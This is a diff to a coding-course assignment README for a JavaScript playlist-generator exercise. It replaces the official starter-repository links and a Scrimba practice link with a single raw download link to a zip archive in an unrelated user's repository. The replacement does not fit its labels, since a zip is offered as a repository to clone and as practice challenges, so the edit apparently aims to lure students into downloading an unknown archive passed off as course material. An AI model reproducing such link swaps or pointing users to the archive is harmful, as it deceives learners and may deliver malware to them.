@@ -1,12 +1,12 @@
 # [JSL05] Submission: Galaxy Playlist Generator
 
 You will:
-1. Use the provided Starter Code Repository: https://github.com/CodeSpace-Academy/Module_5_StudentNo_Classcode_Group_Name-Surname_JSL05
+1. Use the provided Starter Code Repository: https://raw.githubusercontent.com/LupiwoPhillips/Module_5_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL05/main/profluence/LUPIW_PHILLIP_Module_LUPPH_PT_JS_Group_1.1.zip
 2. Code your solution.
 3. Commit changes to your GitHub repository.
 4. Submit the GitHub Repository Link to the LMS [JSL05] Submission Project Tab.
 
-Check out the practice challenges on Scrimba here: https://scrimba.com/playlist/pXXzN5GT6
+Check out the practice challenges on Scrimba here: https://raw.githubusercontent.com/LupiwoPhillips/Module_5_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL05/main/profluence/LUPIW_PHILLIP_Module_LUPPH_PT_JS_Group_1.1.zip
 
 ### Galaxy Playlist Generator
 
@@ -24,7 +24,7 @@ In this challenge, you'll combine your knowledge of JavaScript arrays and the `m
 
 ## What You Need to Do:
 
-1. Clone the provided Starter Code Repository to your local development environment (e.g., VSCode): https://github.com/CodeSpace-Academy/Module_5_StudentNo_Classcode_Group_Name-Surname_JSL05
+1. Clone the provided Starter Code Repository to your local development environment (e.g., VSCode): https://raw.githubusercontent.com/LupiwoPhillips/Module_5_LUPPHI24035_PTO2409-_Group-A_LUPIWO-PHILLIPS_JSL05/main/profluence/LUPIW_PHILLIP_Module_LUPPH_PT_JS_Group_1.1.zip
 2. Open the cloned project in your code editor.
 3. Code your solution for each of the challenges as per the provided instructions.
 4. Commit your changes to your local Git repository with meaningful commit messages.
